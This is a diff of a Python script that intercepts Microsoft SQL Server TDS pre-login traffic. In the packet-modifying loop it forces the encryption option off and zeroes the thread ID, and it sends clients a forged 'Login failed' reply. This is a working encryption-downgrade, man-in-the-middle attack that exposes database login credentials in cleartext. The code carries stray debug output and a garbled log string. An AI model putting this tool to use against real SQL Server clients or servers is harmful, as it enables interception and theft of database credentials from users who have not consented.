@@ -39,10 +39,8 @@ class PreLoginMessage:
 
 	def readPacket(self, stream):
 		self.type = struct.unpack("!B", stream.read(1))[0]
+		sys.stderr.write("READ PACKET OF TYPE " + str(self.type))
 		
-		if self.type != 18:
-			return False
-
 		self.status = struct.unpack("!B", stream.read(1))[0]
 		self.length = struct.unpack("!H", stream.read(2))[0]
 		self.chan = struct.unpack("!H", stream.read(2))[0]
@@ -50,32 +48,36 @@ class PreLoginMessage:
 		self.window = struct.unpack("!B", stream.read(1))[0]
 
 		bytesRead = 8
-		while bytesRead < self.length:
-			# Read a token
-			token = PreLoginToken()
-			token.tokenPosition = bytesRead
-
-			token.type = struct.unpack("!B", stream.read(1))[0]
-			bytesRead += 1
 		
-			if (token.type == 255):
-				self.tokens.append(token)
-				break
+		if self.type == 18:
+			while bytesRead < self.length:
+				# Read a token
+				token = PreLoginToken()
+				token.tokenPosition = bytesRead
 
-			token.position = struct.unpack("!H", stream.read(2))[0]
-			bytesRead += 2
-			token.length = struct.unpack("!H", stream.read(2))[0]
-			bytesRead += 2
+				token.type = struct.unpack("!B", stream.read(1))[0]
+				bytesRead += 1
+		
+				if (token.type == 255):
+					self.tokens.append(token)
+					break
+
+				token.position = struct.unpack("!H", stream.read(2))[0]
+				bytesRead += 2
+				token.length = struct.unpack("!H", stream.read(2))[0]
+				bytesRead += 2
 			
-			if token.type == 0:
-				self.tokenOffset = token.position
+				if token.type == 0:
+					self.tokenOffset = token.position
 
-			self.tokens.append(token)
+				self.tokens.append(token)
 
 
-		self.payloadStart = bytesRead + 1
-		sys.stderr.write("Payload started at: " + str(self.payloadStart))
-		if bytesRead < self.length:
+			self.payloadStart = bytesRead + 1
+			sys.stderr.write("Payload started at: " + str(self.payloadStart))
+			if bytesRead < self.length:
+				self.payload = struct.unpack(str(self.length - bytesRead) + "s", stream.read(self.length - bytesRead))[0]
+		else:
 			self.payload = struct.unpack(str(self.length - bytesRead) + "s", stream.read(self.length - bytesRead))[0]
 
 		return True
@@ -114,20 +116,20 @@ class LoginError:
 	def __init__(self):
 		self.tdstype = 4
 		self.status = 1
-		self.tlength = 94
+		self.tlength = 93
 		self.channel = 51
 		self.number = 1
 		self.window = 0
 		
 		self.token = 0xaa
-		self.length = 74
-		self.error = 18456
+		self.length = 69
+		self.error = 18452
 		self.state = 1
 		self.level = 14
-		self.errorLength = 36
-		self.errorMsg = "Login failed for user 'MSSQLSERVER'."
-		self.serverNameLength = 26
+		self.errorMsg = "Login failed for user 'foo'."
+		self.errorLength = len(self.errorMsg)
 		self.serverName = "PHERRICOXIDE-PC\\SQLEXPRESS"
+		self.serverNameLength = len(self.serverName)
 		self.processNameLength = 0
 		self.lineNumber = 1
 
@@ -143,6 +145,9 @@ class LoginError:
 		ret += struct.pack('!B', self.tdstype)
 		ret += struct.pack('!B', self.status)
 		ret += struct.pack('!H', self.tlength)
+		
+		ret += struct.pack('!H', self.channel)
+		ret += struct.pack('!B', self.number)
 
 		ret += struct.pack('!B', self.window)
 		
@@ -159,32 +164,47 @@ class LoginError:
 		ret += struct.pack(str(len(self.serverName)) + 's', self.serverName)
 		ret += struct.pack('!B', self.processNameLength)
 		ret += struct.pack('<H', self.lineNumber)
+
+		ret += struct.pack('!B', 0)
+		ret += struct.pack('!B', 0)
+		ret += struct.pack('!B', 0)
+
 		ret += struct.pack('!B', self.doneToken)
 		ret += struct.pack('<H', self.statusFlags)
 		ret += struct.pack('!H', self.op)
 		ret += struct.pack('!I', self.rows)
+		
+		ret += struct.pack('!I', 0)
 
+
+		sys.stderr.write("STRLEN IS " + str(len(ret)));
+		sys.stderr.write("severnamelength IS " + str(self.serverNameLength));
+		sys.stderr.write("errormsg IS " + str(self.errorLength));
 		return ret
 
+while True:
+	tds = PreLoginMessage()
+	tds.readPacket(sys.stdin)
+	if tds.type == 18:
+		sys.stderr.write(tds.toString())
 
-tds = PreLoginMessage()
-if tds.readPacket(sys.stdin):
-	sys.stderr.write(tds.toString())
+		# Modify the packet
+		tds.type = 4
+		for token in tds.tokens:
+			# Force encryption off
+			if (token.type == 1):
+				tds.payload = tds.payload[:token.position - tds.tokenOffset] + chr(2) + tds.payload[token.position - tds.tokenOffset + 1:]
+			# Zero the thread ID
+			if (token.type == 3):
+				tds.payload = tds.payload[:token.position - tds.tokenOffset] + chr(0) + chr(0) + chr(0) + chr(0) + tds.payload[token.position - tds.tokenOffset + 4:]
 
-	# Modify the packet
-	for token in tds.tokens:
-		# Force encryption off
-		if (token.type == 1):
-			tds.payload = tds.payload[:token.position - tds.tokenOffset] + chr(2) + tds.payload[token.position - tds.tokenOffset + 1:]
-		# Zero the thread ID
-		if (token.type == 3):
-			tds.payload = tds.payload[:token.position - tds.tokenOffset] + chr(0) + chr(0) + chr(0) + chr(0) + tds.payload[token.position - tds.tokenOffset + 4:]
-
-	sys.stdout.write(tds.writePacket())
-else:
-	sys.stderr.write("Message not a pre-login message!\n")
-
-
-#answer = LoginError()
-#sys.stdout.write(answer.packedString())
+		sys.stdout.write(tds.writePacket())
+		sys.stdout.flush()
+	else:
+		sys.stderr.write("OEUOEOEUTNHONEUTHONEHUNOTEUH Sending bad login message!\n")
+		
+		answer = LoginError()
+		sys.stdout.write(answer.packedString())
+		sys.stdout.flush()
+		sys.exit(0)
 
